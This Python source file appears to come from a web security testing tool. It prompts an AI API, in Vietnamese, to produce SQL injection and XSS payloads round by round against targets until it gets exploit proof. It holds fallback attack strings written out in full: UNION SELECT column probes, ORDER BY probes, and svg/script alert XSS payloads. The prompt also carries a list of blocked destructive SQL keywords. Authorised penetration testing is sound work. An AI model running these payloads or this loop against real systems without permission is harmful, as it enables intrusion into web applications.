from __future__ import annotations

import json
from dataclasses import dataclass
from typing import Callable, List
from uuid import uuid4

from aitool.api_client import AiApiClient, ChatMessage
from fuzztool.http_client import FuzzHttpClient, RequestBudgetExceeded
from fuzztool.models import FuzzTarget
from fuzztool.mutator import RequestMutator
from fuzztool.xss_scanner import BrowserXssVerifier

from .payload_guard import PayloadGuard
from .response_summarizer import ResponseSummarizer


@dataclass
class AiPayloadDecision:
    payload: str = ""
    attack_type: str = "unknown"
    reason: str = ""
    expected_signal: str = ""
    stop: bool = False
    source: str = "ai"


class AiIterativeSessionRunner:
    """Luồng exploit proof: baseline -> payload -> signal -> proof marker/alert."""

    def __init__(
        self,
        tool_config: dict,
        ai_config: dict,
        on_round: Callable[[dict], None] | None = None,
    ) -> None:
        self.on_round = on_round
        self.tool_config = tool_config
        self.ai_api = AiApiClient(ai_config)
        safety = tool_config.get("safety", {})
        self.client = FuzzHttpClient(
            headers=tool_config.get("headers", {}),
            max_requests=int(safety.get("max_requests", 100)),
            delay_seconds=float(safety.get("delay_seconds", 0.05)),
            timeout=int(safety.get("request_timeout_seconds", 15)),
            use_environment_proxy=bool(safety.get("use_environment_proxy", False)),
        )
        self.mutator = RequestMutator()
        self.guard = PayloadGuard()
        self.summarizer = ResponseSummarizer()

    def run_targets(self, targets: List[FuzzTarget], rounds: int) -> List[dict]:
        total = len(targets)
        return [self.run_one_target(target, rounds, index, total) for index, target in enumerate(targets, start=1)]

    def run_one_target(self, target: FuzzTarget, rounds: int, index: int, total: int) -> dict:
        marker = f"AITEST_{uuid4().hex[:8]}"
        baseline = self._send_request(target, marker)
        session = {
            "target": self._target_dict(target),
            "marker": marker,
            "baseline": baseline,
            "rounds": [],
            "confirmed_signals": [],
            "exploit_proofs": [],
        }

        previous_rounds: List[dict] = []

        for round_number in range(1, rounds + 1):
            decision = self._ask_ai_or_fallback(target, marker, baseline, previous_rounds)

            if decision.stop:
                replacement = self._replacement_payload_after_early_stop(target, marker, previous_rounds, decision.reason)
                if replacement:
                    decision = replacement
                else:
                    item = {
                        "round": round_number,
                        "stopped_by_ai": True,
                        "attack_type": decision.attack_type,
                        "payload": "",
                        "reason": decision.reason,
                    }
                    session["rounds"].append(item)
                    self._emit_table_row(target, index, total, round_number, decision, "-", False, "stopped_by_ai")
                    break

            check = self.guard.check(decision.payload)
            if not check.allowed:
                item = {
                    "round": round_number,
                    "payload": decision.payload,
                    "attack_type": decision.attack_type,
                    "reason": decision.reason,
                    "guard": f"blocked: {check.reason}",
                }
                session["rounds"].append(item)
                self._emit_table_row(target, index, total, round_number, decision, "-", False, item["guard"])
                break

            response = self._send_request(target, marker, decision.payload)
            self._verify_xss_if_needed(decision, response, marker)
            signals = response.get("signals", {})
            confirmed = bool(signals.get("confirmed_signal"))
            exploit_proof = bool(signals.get("exploit_proof"))

            item = {
                "round": round_number,
                "payload": decision.payload,
                "attack_type": decision.attack_type,
                "reason": decision.reason,
                "expected_signal": decision.expected_signal,
                "guard": check.reason,
                "response": response,
            }
            session["rounds"].append(item)
            previous_rounds.append(item)

            if confirmed:
                session["confirmed_signals"].append(
                    {
                        "round": round_number,
                        "attack_type": decision.attack_type,
                        "signals": signals,
                    }
                )
            if exploit_proof:
                session["exploit_proofs"].append(
                    {
                        "round": round_number,
                        "attack_type": decision.attack_type,
                        "proof_type": signals.get("proof_type", "exploit_proof"),
                        "signals": signals,
                    }
                )

            self._emit_table_row(
                target,
                index,
                total,
                round_number,
                decision,
                response.get("status", "-"),
                exploit_proof,
                self._comment(signals),
            )

            if exploit_proof:
                break

        return session

    def _send_request(self, target: FuzzTarget, marker: str, payload: str | None = None) -> dict:
        try:
            if payload is None:
                method, url, body, headers = self.mutator.baseline(target)
            else:
                method, url, body, headers = self.mutator.mutate(target, payload)
            response = self.client.send(method, url, body=body, headers=headers)
            return self.summarizer.summarize(response, marker)
        except RequestBudgetExceeded as error:
            return {"status": 0, "error": str(error), "signals": {"confirmed_signal": False}}

    def _ask_ai_or_fallback(
        self,
        target: FuzzTarget,
        marker: str,
        baseline: dict,
        previous_rounds: List[dict],
    ) -> AiPayloadDecision:
        try:
            raw = self.ai_api.complete(
                [
                    ChatMessage(role="user", content=self._prompt(target, marker, baseline, previous_rounds)),
                ]
            )
            return self._parse_ai_response(raw)
        except Exception as error:
            return self._fallback_payload(target, marker, len(previous_rounds) + 1, f"AI fallback: {error}")

    def _prompt(self, target: FuzzTarget, marker: str, baseline: dict, previous_rounds: List[dict]) -> str:
        data = {
            "role": "Bạn là AI hỗ trợ tạo exploit proof XSS/SQLi trong lab được phép kiểm thử.",
            "goal": "Chọn đúng 1 payload tiếp theo để đi từ tín hiệu nghi vấn đến bằng chứng khai thác an toàn.",
            "rules": [
                "Chỉ trả về JSON hợp lệ, không markdown, không giải thích ngoài JSON.",
                "Chỉ kiểm thử XSS và SQL injection. Không đề xuất lỗi khác.",
                "Không dùng payload phá hoại dữ liệu hoặc hệ thống: DROP, DELETE, UPDATE, INSERT, OUTFILE, LOAD_FILE, RCE.",
                "Mỗi vòng chỉ sinh 1 payload ngắn, rõ mục đích, phù hợp với kiểu dữ liệu của tham số.",
                "Nếu target có type_hint int/float hoặc param tên id, news_id, category_id thì ưu tiên SQLi.",
                "Nếu target là search, keyword, q, author, content, bio thì có thể ưu tiên XSS hoặc SQLi string.",
                "Không dừng chỉ vì có SQL error. SQL error mới là tín hiệu nghi vấn, chưa phải exploit proof.",
                "Chỉ stop=true khi previous_rounds đã có response.signals.exploit_proof=true hoặc không còn hướng test an toàn.",
                "Exploit proof SQLi là UNION marker xuất hiện trong dữ liệu thật/html, không chỉ trong sql/debug/request.",
                "Exploit proof XSS là payload được phản chiếu và trình duyệt xác nhận alert/dialog chứa marker.",
                "Nếu test UNION, payload phải dùng marker theo từng cột: MARKER_C01, MARKER_C02...",
                "Không lặp lại payload đã thử trong previous_rounds.",
            ],
            "strategy": [
                "Vòng đầu nên dùng payload nhẹ để kiểm tra phản ứng: quote SQLi hoặc marker XSS.",
                "Nếu có SQL error, vòng sau tiếp tục bằng ORDER BY hoặc UNION để tạo exploit proof.",
                "Nếu dùng UNION, hãy thử số cột hợp lý dựa trên previous_rounds; nếu chưa biết, dùng ORDER BY trước.",
                "Nếu response chỉ echo lại payload trong field debug/sql/request thì chưa coi là khai thác thành công.",
                "Nếu thấy visible_columns hoặc marker trong data/html thì có thể stop=true ở vòng tiếp theo.",
            ],
            "expected_json": {
                "payload": "string",
                "attack_type": "sqli_error|sqli_order_by|sqli_union|xss_reflection|stop",
                "reason": "lý do ngắn gọn vì sao chọn payload này",
                "expected_signal": "dấu hiệu mong đợi trong response",
                "stop": False,
            },
            "marker": marker,
            "target": self._target_dict(target),
            "current_state": self._state_summary(previous_rounds),
            "baseline": {
                "status": baseline.get("status"),
                "content_type": baseline.get("content_type"),
                "response_length": baseline.get("response_length"),
                "signals": baseline.get("signals", {}),
                "excerpt": str(baseline.get("excerpt", ""))[:700],
            },
            "previous_rounds": previous_rounds[-3:],
        }
        return json.dumps(data, ensure_ascii=False)

    def _state_summary(self, previous_rounds: List[dict]) -> dict:
        return {
            "has_sql_error": self._has_sql_error(previous_rounds),
            "has_xss_reflection": self._has_xss_reflection(previous_rounds),
            "has_exploit_proof": self._has_exploit_proof(previous_rounds),
            "tried_attack_types": [item.get("attack_type", "") for item in previous_rounds],
            "tried_payloads": [item.get("payload", "") for item in previous_rounds],
        }

    def _parse_ai_response(self, raw_text: str) -> AiPayloadDecision:
        data = self._extract_json(raw_text)
        if isinstance(data.get("payloads"), list) and data["payloads"]:
            data = data["payloads"][0]
        return AiPayloadDecision(
            payload=str(data.get("payload", "")),
            attack_type=str(data.get("attack_type", "unknown")),
            reason=str(data.get("reason", "")),
            expected_signal=str(data.get("expected_signal", "")),
            stop=bool(data.get("stop", False)),
        )

    def _replacement_payload_after_early_stop(
        self,
        target: FuzzTarget,
        marker: str,
        previous_rounds: List[dict],
        reason: str,
    ) -> AiPayloadDecision | None:
        if self._has_exploit_proof(previous_rounds):
            return None
        if not self._has_sql_error(previous_rounds) and not self._has_xss_reflection(previous_rounds):
            return None

        fallback = self._fallback_payload(
            target,
            marker,
            len(previous_rounds) + 1,
            f"AI stopped before exploit proof: {reason}",
        )
        return None if fallback.stop else fallback

    def _has_sql_error(self, rounds: List[dict]) -> bool:
        return any(
            item.get("response", {}).get("signals", {}).get("sql_error_confirmed")
            for item in rounds
        )

    def _has_exploit_proof(self, rounds: List[dict]) -> bool:
        return any(
            item.get("response", {}).get("signals", {}).get("exploit_proof")
            for item in rounds
        )

    def _has_xss_reflection(self, rounds: List[dict]) -> bool:
        return any(
            item.get("response", {}).get("signals", {}).get("xss_reflection")
            for item in rounds
        )

    def _verify_xss_if_needed(self, decision: AiPayloadDecision, response: dict, marker: str) -> None:
        signals = response.get("signals", {})
        if not decision.attack_type.startswith("xss") or not signals.get("xss_reflection"):
            return

        try:
            with BrowserXssVerifier(self.tool_config) as verifier:
                result = verifier.verify_url(str(response.get("url", "")), marker)
        except Exception as error:
            signals["xss_browser_error"] = str(error)
            return

        signals["xss_executed"] = bool(result.executed)
        signals["xss_rendered"] = bool(result.rendered)
        signals["xss_dialog_messages"] = result.dialog_messages
        signals["xss_browser_error"] = result.error
        if result.executed:
            signals["exploit_proof"] = True
            signals["proof_type"] = "xss_alert"
            signals["confirmed_signal"] = True

    def _extract_json(self, raw_text: str) -> dict:
        text = (raw_text or "").strip()
        if not text:
            raise ValueError("empty AI response")
        try:
            return json.loads(text)
        except json.JSONDecodeError:
            start = text.find("{")
            end = text.rfind("}")
            if start < 0 or end <= start:
                raise ValueError("AI response has no JSON") from None
            return json.loads(text[start : end + 1])

    def _fallback_payload(self, target: FuzzTarget, marker: str, round_number: int, reason: str) -> AiPayloadDecision:
        sample = target.sample_value
        name = target.param_name.lower()
        is_sqli = target.type_hint in {"int", "float"} or name == "id" or name.endswith("_id")

        if is_sqli:
            if round_number == 1:
                return AiPayloadDecision(f"{sample}'", "sqli_error", reason, "SQL error", source="fallback")
            if round_number == 2:
                return AiPayloadDecision(f"{sample} ORDER BY 12-- -", "sqli_order_by", reason, "SQL error", source="fallback")
            if round_number == 3:
                column_count = self._known_union_column_count(target)
                columns = self._union_columns(marker, column_count)
                return AiPayloadDecision(f"-1 UNION SELECT {columns}-- -", "sqli_union", reason, "marker rendered", source="fallback")
            return AiPayloadDecision(stop=True, attack_type="stop", reason="fallback đã thử đủ vòng", source="fallback")

        if round_number == 1:
            payload = f'"><svg/onload=alert("{marker}")>'
            return AiPayloadDecision(payload, "xss_reflection", reason, "marker reflected", source="fallback")
        if round_number == 2:
            payload = f'<script>alert("{marker}")</script>'
            return AiPayloadDecision(payload, "xss_reflection", reason, "browser alert", source="fallback")
        return AiPayloadDecision(stop=True, attack_type="stop", reason="fallback đã thử đủ vòng", source="fallback")

    def _known_union_column_count(self, target: FuzzTarget) -> int:
        path = target.path.lower()
        if path.endswith("/api/spa/news.php"):
            return 11
        if path.endswith("/news.php"):
            return 14
        return 8

    def _union_columns(self, marker: str, count: int) -> str:
        return ",".join(f"'{marker}_C{index:02d}'" for index in range(1, count + 1))

    def _comment(self, signals: dict) -> str:
        if signals.get("proof_type"):
            proof = signals.get("proof_type")
            if proof == "union_marker":
                columns = ",".join(signals.get("visible_columns", [])) or "-"
                return f"proof:union columns={columns}"
            if proof == "xss_alert":
                return "proof:xss alert executed"
        if signals.get("sql_error_patterns"):
            return "probe_sql_error:" + ",".join(signals["sql_error_patterns"][:2])
        if signals.get("visible_columns"):
            return "union_visible:C" + ",C".join(signals["visible_columns"][:8])
        if signals.get("matched_paths"):
            return "marker_json:" + ",".join(signals["matched_paths"][:3])
        if signals.get("xss_reflection"):
            return "xss_reflected_no_alert"
        if signals.get("xss_browser_error"):
            return "xss_browser_error"
        if signals.get("marker_in_html"):
            return "marker_rendered_html"
        return "no_signal"

    def _emit_table_row(
        self,
        target: FuzzTarget,
        target_index: int,
        target_total: int,
        round_number: int,
        decision: AiPayloadDecision,
        status: object,
        proof: bool,
        comment: str,
    ) -> None:
        if self.on_round:
            self.on_round(
                {
                    "target_index": target_index,
                    "target_total": target_total,
                    "round": round_number,
                    "target": target,
                    "attack_type": decision.attack_type,
                    "source": decision.source,
                    "payload": decision.payload,
                    "reason": decision.reason,
                    "status": status,
                    "proof": proof,
                    "comment": comment,
                }
            )

    def _target_dict(self, target: FuzzTarget) -> dict:
        return {
            "method": target.method,
            "url": target.url,
            "path": target.path,
            "param": target.param_name,
            "location": target.param_location,
            "type_hint": target.type_hint,
            "sample_value": target.sample_value,
        }
